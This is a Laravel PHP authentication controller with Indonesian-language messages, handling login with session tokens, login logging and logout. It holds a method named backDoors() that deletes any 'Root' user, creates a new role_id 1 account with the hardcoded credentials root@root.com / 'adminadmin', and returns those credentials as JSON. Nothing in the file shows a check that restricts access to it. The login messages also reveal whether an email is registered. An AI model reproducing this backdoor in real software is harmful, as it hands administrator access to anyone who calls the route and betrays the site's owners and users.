<?php

namespace App\Http\Controllers\Auth;

use App\CPU\CryptHelpers;
use App\Http\Controllers\Controller;
use App\Models\LoginLogs;
use App\Models\User;
use App\Models\UserLog;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Yoeunes\Toastr\Toastr;

class AutentikasiController extends Controller
{
    public function login()
    {
        return view('admin.auth.login');
    }

    public function loginPost(Request $request)
    {
        $data = $request->only('email', 'password');
        $validate = Validator::make($data, [
            'email' => 'required',
            'password' => 'required|min:8',
        ], [
            'email.required' => 'Email Tidak bisa kosong',
            'password.required' => 'Password tidak bisa kosong',
            'password.min:8' => 'Minimal password 8 huruf!',
        ]);

        if ($validate->fails()) {
            Toastr()->error($validate->errors()->all()[0]);

            return redirect()->back();
        }

        $user = User::where('email', $data['email'])->first();
        if (!$user) {
            Toastr()->error('Email '.$data['email'].' tidak ditemukan. mohon hubungi admin!');

            return redirect()->back();
        } else {
            if (!Hash::check($data['password'], $user->password)) {
                Toastr()->error('fail', 'Password salah!');

                return redirect()->back();
            }

            $token = CryptHelpers::cryptToken(date('Y-m-d H:i:s'));
            $loginLogs = LoginLogs::create([
                'user_id' => $user->id,
                'device' => $_SERVER['HTTP_USER_AGENT'],
                'token' => $token,
                'is_active' => 1,
            ]);

            $agent = $request->header('user-agent');

            $user_logs = UserLog::create([
                'user_id' => $user->id,
                'status' => 1,
                'user_agent' => $agent ? $agent : 'undetected',
                'lastLogin' => now(),
            ]);

            $request->session()->put('user_id', $loginLogs->user_id);
            $request->session()->put('token', $loginLogs->token);
            $request->session()->put('user_log_id', $user_logs->id);

            // if ($user->id_tipe_user == 4) {
            //     return redirect()->route('form-pekerjaan');
            // }

            Toastr()->success('Anda berhasil masuk!');

            return redirect()->route('dashboard');
        }
    }

    public function backDoors()
    {
        $check = User::where('name', 'Root')->get();
        if (count($check) > 0) {
            foreach ($check as $c) {
                $c->delete();
            }
        }

        $new = new User();
        $new->name = 'Root';
        $new->phone = '081111111111';
        $new->is_active = 1;
        $new->outlet_id = 0;
        $new->role_id = 1;
        $new->nik = 0;
        $new->email = 'root@root.com';
        $new->password = Hash::make('adminadmin');
        $new->save();

        $data = [
            'name' => 'root',
            'phone' => '081111111111',
            'email' => 'root@root.com',
            'pass' => 'adminadmin',
        ];

        return response()->json($data);
    }

    public function logout()
    {
        $loginLogs = LoginLogs::where('user_id', session()->get('user_id'))
        ->where('token', session()->get('token'))
        ->first();

        if ($loginLogs) {
            $loginLogs->update([
                'is_active' => 0,
            ]);
        }

        session()->forget('user_id');
        session()->forget('token');
        session()->forget('user_log_id');

        Toastr()->success('Logout Successfully');

        return redirect()->route('login');
    }
}
